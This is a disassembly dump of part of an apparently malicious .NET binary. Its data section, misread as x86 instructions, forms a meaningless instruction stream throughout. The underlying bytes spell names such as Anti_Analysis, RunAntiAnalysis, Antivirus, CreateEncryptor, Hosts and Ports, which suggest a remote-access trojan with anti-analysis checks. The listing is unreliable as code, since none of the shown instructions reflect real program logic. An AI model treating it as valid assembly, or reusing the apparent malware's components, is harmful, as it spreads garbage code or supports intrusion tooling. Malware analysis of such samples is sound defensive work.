  408c1c:	67 65 6d             	gs insl (%dx),%es:(%di)
  408c1f:	65 6e                	outsb  %gs:(%esi),(%dx)
  408c21:	74 4f                	je     0x408c72
  408c23:	62 6a 65             	bound  %ebp,0x65(%edx)
  408c26:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  408c2a:	61                   	popa
  408c2b:	72 63                	jb     0x408c90
  408c2d:	68 65 72 00 53       	push   $0x53007265
  408c32:	65 73 73             	gs jae 0x408ca8
  408c35:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408c3c:	6e                   	outsb  %ds:(%esi),(%dx)
  408c3d:	67 45                	addr16 inc %ebp
  408c3f:	76 65                	jbe    0x408ca6
  408c41:	6e                   	outsb  %ds:(%esi),(%dx)
  408c42:	74 48                	je     0x408c8c
  408c44:	61                   	popa
  408c45:	6e                   	outsb  %ds:(%esi),(%dx)
  408c46:	64 6c                	fs insb (%dx),%es:(%edi)
  408c48:	65 72 00             	gs jb  0x408c4b
  408c4b:	54                   	push   %esp
  408c4c:	69 6d 65 72 00 6f 77 	imul   $0x776f0072,0x65(%ebp),%ebp
  408c53:	6e                   	outsb  %ds:(%esi),(%dx)
  408c54:	65 72 00             	gs jb  0x408c57
  408c57:	43                   	inc    %ebx
  408c58:	6c                   	insb   (%dx),%es:(%edi)
  408c59:	69 65 6e 74 2e 48 65 	imul   $0x65482e74,0x6e(%ebp),%esp
  408c60:	6c                   	insb   (%dx),%es:(%edi)
  408c61:	70 65                	jo     0x408cc8
  408c63:	72 00                	jb     0x408c65
  408c65:	54                   	push   %esp
  408c66:	6f                   	outsl  %ds:(%esi),(%dx)
  408c67:	55                   	push   %ebp
  408c68:	70 70                	jo     0x408cda
  408c6a:	65 72 00             	gs jb  0x408c6d
  408c6d:	44                   	inc    %esp
  408c6e:	65 74 65             	gs je  0x408cd6
  408c71:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  408c75:	6e                   	outsb  %ds:(%esi),(%dx)
  408c76:	75 66                	jne    0x408cde
  408c78:	61                   	popa
  408c79:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  408c7d:	65 72 00             	gs jb  0x408c80
  408c80:	43                   	inc    %ebx
  408c81:	75 72                	jne    0x408cf5
  408c83:	72 65                	jb     0x408cea
  408c85:	6e                   	outsb  %ds:(%esi),(%dx)
  408c86:	74 55                	je     0x408cdd
  408c88:	73 65                	jae    0x408cef
  408c8a:	72 00                	jb     0x408c8c
  408c8c:	53                   	push   %ebx
  408c8d:	74 72                	je     0x408d01
  408c8f:	65 61                	gs popa
  408c91:	6d                   	insl   (%dx),%es:(%edi)
  408c92:	57                   	push   %edi
  408c93:	72 69                	jb     0x408cfe
  408c95:	74 65                	je     0x408cfc
  408c97:	72 00                	jb     0x408c99
  408c99:	54                   	push   %esp
  408c9a:	65 78 74             	gs js  0x408d11
  408c9d:	57                   	push   %edi
  408c9e:	72 69                	jb     0x408d09
  408ca0:	74 65                	je     0x408d07
  408ca2:	72 00                	jb     0x408ca4
  408ca4:	45                   	inc    %ebp
  408ca5:	6e                   	outsb  %ds:(%esi),(%dx)
  408ca6:	74 65                	je     0x408d0d
  408ca8:	72 00                	jb     0x408caa
  408caa:	42                   	inc    %edx
  408cab:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  408cb2:	72 
  408cb3:	74 65                	je     0x408d1a
  408cb5:	72 00                	jb     0x408cb7
  408cb7:	54                   	push   %esp
  408cb8:	6f                   	outsl  %ds:(%esi),(%dx)
  408cb9:	4c                   	dec    %esp
  408cba:	6f                   	outsl  %ds:(%esi),(%dx)
  408cbb:	77 65                	ja     0x408d22
  408cbd:	72 00                	jb     0x408cbf
  408cbf:	45                   	inc    %ebp
  408cc0:	72 72                	jb     0x408d34
  408cc2:	6f                   	outsl  %ds:(%esi),(%dx)
  408cc3:	72 00                	jb     0x408cc5
  408cc5:	49                   	dec    %ecx
  408cc6:	45                   	inc    %ebp
  408cc7:	6e                   	outsb  %ds:(%esi),(%dx)
  408cc8:	75 6d                	jne    0x408d37
  408cca:	65 72 61             	gs jb  0x408d2e
  408ccd:	74 6f                	je     0x408d3e
  408ccf:	72 00                	jb     0x408cd1
  408cd1:	4d                   	dec    %ebp
  408cd2:	61                   	popa
  408cd3:	6e                   	outsb  %ds:(%esi),(%dx)
  408cd4:	61                   	popa
  408cd5:	67 65 6d             	gs insl (%dx),%es:(%di)
  408cd8:	65 6e                	outsb  %gs:(%esi),(%dx)
  408cda:	74 4f                	je     0x408d2b
  408cdc:	62 6a 65             	bound  %ebp,0x65(%edx)
  408cdf:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  408ce3:	75 6d                	jne    0x408d52
  408ce5:	65 72 61             	gs jb  0x408d49
  408ce8:	74 6f                	je     0x408d59
  408cea:	72 00                	jb     0x408cec
  408cec:	53                   	push   %ebx
  408ced:	79 73                	jns    0x408d62
  408cef:	74 65                	je     0x408d56
  408cf1:	6d                   	insl   (%dx),%es:(%edi)
  408cf2:	2e 43                	cs inc %ebx
  408cf4:	6f                   	outsl  %ds:(%esi),(%dx)
  408cf5:	6c                   	insb   (%dx),%es:(%edi)
  408cf6:	6c                   	insb   (%dx),%es:(%edi)
  408cf7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408cfc:	6e                   	outsb  %ds:(%esi),(%dx)
  408cfd:	73 2e                	jae    0x408d2d
  408cff:	49                   	dec    %ecx
  408d00:	45                   	inc    %ebp
  408d01:	6e                   	outsb  %ds:(%esi),(%dx)
  408d02:	75 6d                	jne    0x408d71
  408d04:	65 72 61             	gs jb  0x408d68
  408d07:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  408d0b:	47                   	inc    %edi
  408d0c:	65 74 45             	gs je  0x408d54
  408d0f:	6e                   	outsb  %ds:(%esi),(%dx)
  408d10:	75 6d                	jne    0x408d7f
  408d12:	65 72 61             	gs jb  0x408d76
  408d15:	74 6f                	je     0x408d86
  408d17:	72 00                	jb     0x408d19
  408d19:	41                   	inc    %ecx
  408d1a:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408d1e:	61                   	popa
  408d1f:	74 6f                	je     0x408d90
  408d21:	72 00                	jb     0x408d23
  408d23:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  408d28:	00 2e                	add    %ch,(%esi)
  408d2a:	63 63 74             	arpl   %esp,0x74(%ebx)
  408d2d:	6f                   	outsl  %ds:(%esi),(%dx)
  408d2e:	72 00                	jb     0x408d30
  408d30:	4d                   	dec    %ebp
  408d31:	6f                   	outsl  %ds:(%esi),(%dx)
  408d32:	6e                   	outsb  %ds:(%esi),(%dx)
  408d33:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  408d3a:	65 
  408d3b:	61                   	popa
  408d3c:	74 65                	je     0x408da3
  408d3e:	44                   	inc    %esp
  408d3f:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  408d43:	70 74                	jo     0x408db9
  408d45:	6f                   	outsl  %ds:(%esi),(%dx)
  408d46:	72 00                	jb     0x408d48
  408d48:	43                   	inc    %ebx
  408d49:	72 65                	jb     0x408db0
  408d4b:	61                   	popa
  408d4c:	74 65                	je     0x408db3
  408d4e:	45                   	inc    %ebp
  408d4f:	6e                   	outsb  %ds:(%esi),(%dx)
  408d50:	63 72 79             	arpl   %esi,0x79(%edx)
  408d53:	70 74                	jo     0x408dc9
  408d55:	6f                   	outsl  %ds:(%esi),(%dx)
  408d56:	72 00                	jb     0x408d58
  408d58:	49                   	dec    %ecx
  408d59:	6e                   	outsb  %ds:(%esi),(%dx)
  408d5a:	74 50                	je     0x408dac
  408d5c:	74 72                	je     0x408dd0
  408d5e:	00 53 79             	add    %dl,0x79(%ebx)
  408d61:	73 74                	jae    0x408dd7
  408d63:	65 6d                	gs insl (%dx),%es:(%edi)
  408d65:	2e 44                	cs inc %esp
  408d67:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  408d6e:	69 63 73 00 4e 61 74 	imul   $0x74614e00,0x73(%ebx),%esp
  408d75:	69 76 65 4d 65 74 68 	imul   $0x6874654d,0x65(%esi),%esi
  408d7c:	6f                   	outsl  %ds:(%esi),(%dx)
  408d7d:	64 73 00             	fs jae 0x408d80
  408d80:	4d                   	dec    %ebp
  408d81:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408d88:	74 2e                	je     0x408db8
  408d8a:	56                   	push   %esi
  408d8b:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408d92:	73 69                	jae    0x408dfd
  408d94:	63 2e                	arpl   %ebp,(%esi)
  408d96:	44                   	inc    %esp
  408d97:	65 76 69             	gs jbe 0x408e03
  408d9a:	63 65 73             	arpl   %esp,0x73(%ebp)
  408d9d:	00 53 79             	add    %dl,0x79(%ebx)
  408da0:	73 74                	jae    0x408e16
  408da2:	65 6d                	gs insl (%dx),%es:(%edi)
  408da4:	2e 52                	cs push %edx
  408da6:	75 6e                	jne    0x408e16
  408da8:	74 69                	je     0x408e13
  408daa:	6d                   	insl   (%dx),%es:(%edi)
  408dab:	65 2e 49             	gs cs dec %ecx
  408dae:	6e                   	outsb  %ds:(%esi),(%dx)
  408daf:	74 65                	je     0x408e16
  408db1:	72 6f                	jb     0x408e22
  408db3:	70 53                	jo     0x408e08
  408db5:	65 72 76             	gs jb  0x408e2e
  408db8:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  408dbf:	73 74                	jae    0x408e35
  408dc1:	65 6d                	gs insl (%dx),%es:(%edi)
  408dc3:	2e 52                	cs push %edx
  408dc5:	75 6e                	jne    0x408e35
  408dc7:	74 69                	je     0x408e32
  408dc9:	6d                   	insl   (%dx),%es:(%edi)
  408dca:	65 2e 43             	gs cs inc %ebx
  408dcd:	6f                   	outsl  %ds:(%esi),(%dx)
  408dce:	6d                   	insl   (%dx),%es:(%edi)
  408dcf:	70 69                	jo     0x408e3a
  408dd1:	6c                   	insb   (%dx),%es:(%edi)
  408dd2:	65 72 53             	gs jb  0x408e28
  408dd5:	65 72 76             	gs jb  0x408e4e
  408dd8:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  408ddf:	62 75 67             	bound  %esi,0x67(%ebp)
  408de2:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  408de9:	65 
  408dea:	73 00                	jae    0x408dec
  408dec:	45                   	inc    %ebp
  408ded:	78 70                	js     0x408e5f
  408def:	61                   	popa
  408df0:	6e                   	outsb  %ds:(%esi),(%dx)
  408df1:	64 45                	fs inc %ebp
  408df3:	6e                   	outsb  %ds:(%esi),(%dx)
  408df4:	76 69                	jbe    0x408e5f
  408df6:	72 6f                	jb     0x408e67
  408df8:	6e                   	outsb  %ds:(%esi),(%dx)
  408df9:	6d                   	insl   (%dx),%es:(%edi)
  408dfa:	65 6e                	outsb  %gs:(%esi),(%dx)
  408dfc:	74 56                	je     0x408e54
  408dfe:	61                   	popa
  408dff:	72 69                	jb     0x408e6a
  408e01:	61                   	popa
  408e02:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  408e06:	00 47 65             	add    %al,0x65(%edi)
  408e09:	74 50                	je     0x408e5b
  408e0b:	72 6f                	jb     0x408e7c
  408e0d:	63 65 73             	arpl   %esp,0x73(%ebp)
  408e10:	73 65                	jae    0x408e77
  408e12:	73 00                	jae    0x408e14
  408e14:	47                   	inc    %edi
  408e15:	65 74 48             	gs je  0x408e60
  408e18:	6f                   	outsl  %ds:(%esi),(%dx)
  408e19:	73 74                	jae    0x408e8f
  408e1b:	41                   	inc    %ecx
  408e1c:	64 64 72 65          	fs fs jb 0x408e85
  408e20:	73 73                	jae    0x408e95
  408e22:	65 73 00             	gs jae 0x408e25
  408e25:	53                   	push   %ebx
  408e26:	79 73                	jns    0x408e9b
  408e28:	74 65                	je     0x408e8f
  408e2a:	6d                   	insl   (%dx),%es:(%edi)
  408e2b:	2e 53                	cs push %ebx
  408e2d:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408e31:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  408e38:	70 
  408e39:	74 6f                	je     0x408eaa
  408e3b:	67 72 61             	addr16 jb 0x408e9f
  408e3e:	70 68                	jo     0x408ea8
  408e40:	79 2e                	jns    0x408e70
  408e42:	58                   	pop    %eax
  408e43:	35 30 39 43 65       	xor    $0x65433930,%eax
  408e48:	72 74                	jb     0x408ebe
  408e4a:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e51:	73 00                	jae    0x408e53
  408e53:	45                   	inc    %ebp
  408e54:	6e                   	outsb  %ds:(%esi),(%dx)
  408e55:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408e58:	65 32 42 79          	xor    %gs:0x79(%edx),%al
  408e5c:	74 65                	je     0x408ec3
  408e5e:	73 00                	jae    0x408e60
  408e60:	47                   	inc    %edi
  408e61:	65 74 55             	gs je  0x408eb9
  408e64:	74 66                	je     0x408ecc
  408e66:	38 42 79             	cmp    %al,0x79(%edx)
  408e69:	74 65                	je     0x408ed0
  408e6b:	73 00                	jae    0x408e6d
  408e6d:	75 74                	jne    0x408ee3
  408e6f:	66 38 42 79          	data16 cmp %al,0x79(%edx)
  408e73:	74 65                	je     0x408eda
  408e75:	73 00                	jae    0x408e77
  408e77:	52                   	push   %edx
  408e78:	66 63 32             	arpl   %si,(%edx)
  408e7b:	38 39                	cmp    %bh,(%ecx)
  408e7d:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  408e81:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  408e88:	73 00                	jae    0x408e8a
  408e8a:	52                   	push   %edx
  408e8b:	65 61                	gs popa
  408e8d:	64 41                	fs inc %ecx
  408e8f:	6c                   	insb   (%dx),%es:(%edi)
  408e90:	6c                   	insb   (%dx),%es:(%edi)
  408e91:	42                   	inc    %edx
  408e92:	79 74                	jns    0x408f08
  408e94:	65 73 00             	gs jae 0x408e97
  408e97:	44                   	inc    %esp
  408e98:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  408e9c:	65 46                	gs inc %esi
  408e9e:	72 6f                	jb     0x408f0f
  408ea0:	6d                   	insl   (%dx),%es:(%edi)
  408ea1:	42                   	inc    %edx
  408ea2:	79 74                	jns    0x408f18
  408ea4:	65 73 00             	gs jae 0x408ea7
  408ea7:	53                   	push   %ebx
  408ea8:	77 61                	ja     0x408f0b
  408eaa:	70 42                	jo     0x408eee
  408eac:	79 74                	jns    0x408f22
  408eae:	65 73 00             	gs jae 0x408eb1
  408eb1:	4c                   	dec    %esp
  408eb2:	6f                   	outsl  %ds:(%esi),(%dx)
  408eb3:	61                   	popa
  408eb4:	64 46                	fs inc %esi
  408eb6:	69 6c 65 41 73 42 79 	imul   $0x74794273,0x41(%ebp,%eiz,2),%ebp
  408ebd:	74 
  408ebe:	65 73 00             	gs jae 0x408ec1
  408ec1:	47                   	inc    %edi
  408ec2:	65 74 41             	gs je  0x408f06
  408ec5:	73 42                	jae    0x408f09
  408ec7:	79 74                	jns    0x408f3d
  408ec9:	65 73 00             	gs jae 0x408ecc
  408ecc:	53                   	push   %ebx
  408ecd:	65 74 41             	gs je  0x408f11
  408ed0:	73 42                	jae    0x408f14
  408ed2:	79 74                	jns    0x408f48
  408ed4:	65 73 00             	gs jae 0x408ed7
  408ed7:	47                   	inc    %edi
  408ed8:	65 74 42             	gs je  0x408f1d
  408edb:	79 74                	jns    0x408f51
  408edd:	65 73 00             	gs jae 0x408ee0
  408ee0:	72 61                	jb     0x408f43
  408ee2:	77 42                	ja     0x408f26
  408ee4:	79 74                	jns    0x408f5a
  408ee6:	65 73 00             	gs jae 0x408ee9
  408ee9:	62 79 74             	bound  %edi,0x74(%ecx)
  408eec:	65 73 00             	gs jae 0x408eef
  408eef:	43                   	inc    %ebx
  408ef0:	53                   	push   %ebx
  408ef1:	68 61 72 70 41       	push   $0x41707261
  408ef6:	72 67                	jb     0x408f5f
  408ef8:	75 6d                	jne    0x408f67
  408efa:	65 6e                	outsb  %gs:(%esi),(%dx)
  408efc:	74 49                	je     0x408f47
  408efe:	6e                   	outsb  %ds:(%esi),(%dx)
  408eff:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f01:	46                   	inc    %esi
  408f02:	6c                   	insb   (%dx),%es:(%edi)
  408f03:	61                   	popa
  408f04:	67 73 00             	addr16 jae 0x408f07
  408f07:	43                   	inc    %ebx
  408f08:	53                   	push   %ebx
  408f09:	68 61 72 70 42       	push   $0x42707261
  408f0e:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  408f15:	61                   	popa
  408f16:	67 73 00             	addr16 jae 0x408f19
  408f19:	65 73 46             	gs jae 0x408f62
  408f1c:	6c                   	insb   (%dx),%es:(%edi)
  408f1d:	61                   	popa
  408f1e:	67 73 00             	addr16 jae 0x408f21
  408f21:	53                   	push   %ebx
  408f22:	74 72                	je     0x408f96
  408f24:	69 6e 67 73 00 49 6e 	imul   $0x6e490073,0x67(%esi),%ebp
  408f2b:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  408f32:	65 
  408f33:	53                   	push   %ebx
  408f34:	65 74 74             	gs je  0x408fab
  408f37:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  408f3e:	73 73                	jae    0x408fb3
  408f40:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408f47:	6e                   	outsb  %ds:(%esi),(%dx)
  408f48:	67 45                	addr16 inc %ebp
  408f4a:	76 65                	jbe    0x408fb1
  408f4c:	6e                   	outsb  %ds:(%esi),(%dx)
  408f4d:	74 41                	je     0x408f90
  408f4f:	72 67                	jb     0x408fb8
  408f51:	73 00                	jae    0x408f53
  408f53:	41                   	inc    %ecx
  408f54:	6e                   	outsb  %ds:(%esi),(%dx)
  408f55:	74 69                	je     0x408fc0
  408f57:	5f                   	pop    %edi
  408f58:	41                   	inc    %ecx
  408f59:	6e                   	outsb  %ds:(%esi),(%dx)
  408f5a:	61                   	popa
  408f5b:	6c                   	insb   (%dx),%es:(%edi)
  408f5c:	79 73                	jns    0x408fd1
  408f5e:	69 73 00 52 75 6e 41 	imul   $0x416e7552,0x0(%ebx),%esi
  408f65:	6e                   	outsb  %ds:(%esi),(%dx)
  408f66:	74 69                	je     0x408fd1
  408f68:	41                   	inc    %ecx
  408f69:	6e                   	outsb  %ds:(%esi),(%dx)
  408f6a:	61                   	popa
  408f6b:	6c                   	insb   (%dx),%es:(%edi)
  408f6c:	79 73                	jns    0x408fe1
  408f6e:	69 73 00 50 61 63 6b 	imul   $0x6b636150,0x0(%ebx),%esi
  408f75:	73 00                	jae    0x408f77
  408f77:	49                   	dec    %ecx
  408f78:	43                   	inc    %ebx
  408f79:	72 65                	jb     0x408fe0
  408f7b:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f7e:	74 69                	je     0x408fe9
  408f80:	61                   	popa
  408f81:	6c                   	insb   (%dx),%es:(%edi)
  408f82:	73 00                	jae    0x408f84
  408f84:	73 65                	jae    0x408feb
  408f86:	74 5f                	je     0x408fe7
  408f88:	43                   	inc    %ebx
  408f89:	72 65                	jb     0x408ff0
  408f8b:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f8e:	74 69                	je     0x408ff9
  408f90:	61                   	popa
  408f91:	6c                   	insb   (%dx),%es:(%edi)
  408f92:	73 00                	jae    0x408f94
  408f94:	45                   	inc    %ebp
  408f95:	71 75                	jno    0x40900c
  408f97:	61                   	popa
  408f98:	6c                   	insb   (%dx),%es:(%edi)
  408f99:	73 00                	jae    0x408f9b
  408f9b:	53                   	push   %ebx
  408f9c:	73 6c                	jae    0x40900a
  408f9e:	50                   	push   %eax
  408f9f:	72 6f                	jb     0x409010
  408fa1:	74 6f                	je     0x409012
  408fa3:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408fa6:	73 00                	jae    0x408fa8
  408fa8:	52                   	push   %edx
  408fa9:	65 61                	gs popa
  408fab:	64 54                	fs push %esp
  408fad:	6f                   	outsl  %ds:(%esi),(%dx)
  408fae:	6f                   	outsl  %ds:(%esi),(%dx)
  408faf:	6c                   	insb   (%dx),%es:(%edi)
  408fb0:	73 00                	jae    0x408fb2
  408fb2:	57                   	push   %edi
  408fb3:	72 69                	jb     0x40901e
  408fb5:	74 65                	je     0x40901c
  408fb7:	54                   	push   %esp
  408fb8:	6f                   	outsl  %ds:(%esi),(%dx)
  408fb9:	6f                   	outsl  %ds:(%esi),(%dx)
  408fba:	6c                   	insb   (%dx),%es:(%edi)
  408fbb:	73 00                	jae    0x408fbd
  408fbd:	42                   	inc    %edx
  408fbe:	79 74                	jns    0x409034
  408fc0:	65 73 54             	gs jae 0x409017
  408fc3:	6f                   	outsl  %ds:(%esi),(%dx)
  408fc4:	6f                   	outsl  %ds:(%esi),(%dx)
  408fc5:	6c                   	insb   (%dx),%es:(%edi)
  408fc6:	73 00                	jae    0x408fc8
  408fc8:	53                   	push   %ebx
  408fc9:	79 73                	jns    0x40903e
  408fcb:	74 65                	je     0x409032
  408fcd:	6d                   	insl   (%dx),%es:(%edi)
  408fce:	2e 57                	cs push %edi
  408fd0:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  408fd7:	46                   	inc    %esi
  408fd8:	6f                   	outsl  %ds:(%esi),(%dx)
  408fd9:	72 6d                	jb     0x409048
  408fdb:	73 00                	jae    0x408fdd
  408fdd:	44                   	inc    %esp
  408fde:	6e                   	outsb  %ds:(%esi),(%dx)
  408fdf:	73 00                	jae    0x408fe1
  408fe1:	43                   	inc    %ebx
  408fe2:	6f                   	outsl  %ds:(%esi),(%dx)
  408fe3:	6e                   	outsb  %ds:(%esi),(%dx)
  408fe4:	74 61                	je     0x409047
  408fe6:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  408fed:	74 65                	je     0x409054
  408fef:	6d                   	insl   (%dx),%es:(%edi)
  408ff0:	2e 43                	cs inc %ebx
  408ff2:	6f                   	outsl  %ds:(%esi),(%dx)
  408ff3:	6c                   	insb   (%dx),%es:(%edi)
  408ff4:	6c                   	insb   (%dx),%es:(%edi)
  408ff5:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408ffa:	6e                   	outsb  %ds:(%esi),(%dx)
  408ffb:	73 00                	jae    0x408ffd
  408ffd:	53                   	push   %ebx
  408ffe:	74 72                	je     0x409072
  409000:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  409007:	74 4f                	je     0x409058
  409009:	70 74                	jo     0x40907f
  40900b:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  409012:	74 49                	je     0x40905d
  409014:	6d                   	insl   (%dx),%es:(%edi)
  409015:	61                   	popa
  409016:	67 65 44             	addr16 gs inc %esp
  409019:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  40901d:	65 72 73             	gs jb  0x409093
  409020:	00 52 75             	add    %dl,0x75(%edx)
  409023:	6e                   	outsb  %ds:(%esi),(%dx)
  409024:	74 69                	je     0x40908f
  409026:	6d                   	insl   (%dx),%es:(%edi)
  409027:	65 48                	gs dec %eax
  409029:	65 6c                	gs insb (%dx),%es:(%edi)
  40902b:	70 65                	jo     0x409092
  40902d:	72 73                	jb     0x4090a2
  40902f:	00 53 73             	add    %dl,0x73(%ebx)
  409032:	6c                   	insb   (%dx),%es:(%edi)
  409033:	50                   	push   %eax
  409034:	6f                   	outsl  %ds:(%esi),(%dx)
  409035:	6c                   	insb   (%dx),%es:(%edi)
  409036:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  40903d:	72 73                	jb     0x4090b2
  40903f:	00 73 73             	add    %dh,0x73(%ebx)
  409042:	6c                   	insb   (%dx),%es:(%edi)
  409043:	50                   	push   %eax
  409044:	6f                   	outsl  %ds:(%esi),(%dx)
  409045:	6c                   	insb   (%dx),%es:(%edi)
  409046:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  40904d:	72 73                	jb     0x4090c2
  40904f:	00 46 69             	add    %al,0x69(%esi)
  409052:	6c                   	insb   (%dx),%es:(%edi)
  409053:	65 41                	gs inc %ecx
  409055:	63 63 65             	arpl   %esp,0x65(%ebx)
  409058:	73 73                	jae    0x4090cd
  40905a:	00 68 50             	add    %ch,0x50(%eax)
  40905d:	72 6f                	jb     0x4090ce
  40905f:	63 65 73             	arpl   %esp,0x73(%ebp)
  409062:	73 00                	jae    0x409064
  409064:	47                   	inc    %edi
  409065:	65 74 43             	gs je  0x4090ab
  409068:	75 72                	jne    0x4090dc
  40906a:	72 65                	jb     0x4090d1
  40906c:	6e                   	outsb  %ds:(%esi),(%dx)
  40906d:	74 50                	je     0x4090bf
  40906f:	72 6f                	jb     0x4090e0
  409071:	63 65 73             	arpl   %esp,0x73(%ebp)
  409074:	73 00                	jae    0x409076
  409076:	49                   	dec    %ecx
  409077:	50                   	push   %eax
  409078:	41                   	inc    %ecx
  409079:	64 64 72 65          	fs fs jb 0x4090e2
  40907d:	73 73                	jae    0x4090f2
  40907f:	00 43 6f             	add    %al,0x6f(%ebx)
  409082:	6d                   	insl   (%dx),%es:(%edi)
  409083:	70 72                	jo     0x4090f7
  409085:	65 73 73             	gs jae 0x4090fb
  409088:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  40908c:	6f                   	outsl  %ds:(%esi),(%dx)
  40908d:	6d                   	insl   (%dx),%es:(%edi)
  40908e:	70 72                	jo     0x409102
  409090:	65 73 73             	gs jae 0x409106
  409093:	00 53 79             	add    %dl,0x79(%ebx)
  409096:	73 74                	jae    0x40910c
  409098:	65 6d                	gs insl (%dx),%es:(%edi)
  40909a:	2e 4e                	cs dec %esi
  40909c:	65 74 2e             	gs je  0x4090cd
  40909f:	53                   	push   %ebx
  4090a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4090a1:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4090a4:	74 73                	je     0x409119
  4090a6:	00 73 65             	add    %dh,0x65(%ebx)
  4090a9:	74 5f                	je     0x40910a
  4090ab:	41                   	inc    %ecx
  4090ac:	72 67                	jb     0x409115
  4090ae:	75 6d                	jne    0x40911d
  4090b0:	65 6e                	outsb  %gs:(%esi),(%dx)
  4090b2:	74 73                	je     0x409127
  4090b4:	00 53 79             	add    %dl,0x79(%ebx)
  4090b7:	73 74                	jae    0x40912d
  4090b9:	65 6d                	gs insl (%dx),%es:(%edi)
  4090bb:	45                   	inc    %ebp
  4090bc:	76 65                	jbe    0x409123
  4090be:	6e                   	outsb  %ds:(%esi),(%dx)
  4090bf:	74 73                	je     0x409134
  4090c1:	00 50 6f             	add    %dl,0x6f(%eax)
  4090c4:	72 74                	jb     0x40913a
  4090c6:	73 00                	jae    0x4090c8
  4090c8:	45                   	inc    %ebp
  4090c9:	78 69                	js     0x409134
  4090cb:	73 74                	jae    0x409141
  4090cd:	73 00                	jae    0x4090cf
  4090cf:	48                   	dec    %eax
  4090d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4090d1:	73 74                	jae    0x409147
  4090d3:	73 00                	jae    0x4090d5
  4090d5:	41                   	inc    %ecx
  4090d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4090d7:	74 69                	je     0x409142
  4090d9:	76 69                	jbe    0x409144
  4090db:	72 75                	jb     0x409152
  4090dd:	73 00                	jae    0x4090df
  4090df:	43                   	inc    %ebx
  4090e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4090e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4090e2:	63 61 74             	arpl   %esp,0x74(%ecx)
  4090e5:	00 49 6d             	add    %cl,0x6d(%ecx)
  4090e8:	61                   	popa
  4090e9:	67 65 46             	addr16 gs inc %esi
  4090ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4090ed:	72 6d                	jb     0x40915c
  4090ef:	61                   	popa
  4090f0:	74 00                	je     0x4090f2
  4090f2:	66 6f                	outsw  %ds:(%esi),(%dx)
  4090f4:	72 6d                	jb     0x409163
  4090f6:	61                   	popa
  4090f7:	74 00                	je     0x4090f9
  4090f9:	57                   	push   %edi
  4090fa:	72 69                	jb     0x409165
  4090fc:	74 65                	je     0x409163
  4090fe:	46                   	inc    %esi
  4090ff:	6c                   	insb   (%dx),%es:(%edi)
  409100:	6f                   	outsl  %ds:(%esi),(%dx)
  409101:	61                   	popa
  409102:	74 00                	je     0x409104
  409104:	67 65 74 5f          	addr16 gs je 0x409167
  409108:	41                   	inc    %ecx
  409109:	73 46                	jae    0x409151
  40910b:	6c                   	insb   (%dx),%es:(%edi)
  40910c:	6f                   	outsl  %ds:(%esi),(%dx)
  40910d:	61                   	popa
  40910e:	74 00                	je     0x409110
  409110:	73 65                	jae    0x409177
  409112:	74 5f                	je     0x409173
  409114:	41                   	inc    %ecx
  409115:	73 46                	jae    0x40915d
  409117:	6c                   	insb   (%dx),%es:(%edi)
  409118:	6f                   	outsl  %ds:(%esi),(%dx)
  409119:	61                   	popa
  40911a:	74 00                	je     0x40911c
  40911c:	47                   	inc    %edi
  40911d:	65 74 41             	gs je  0x409161
  409120:	73 46                	jae    0x409168
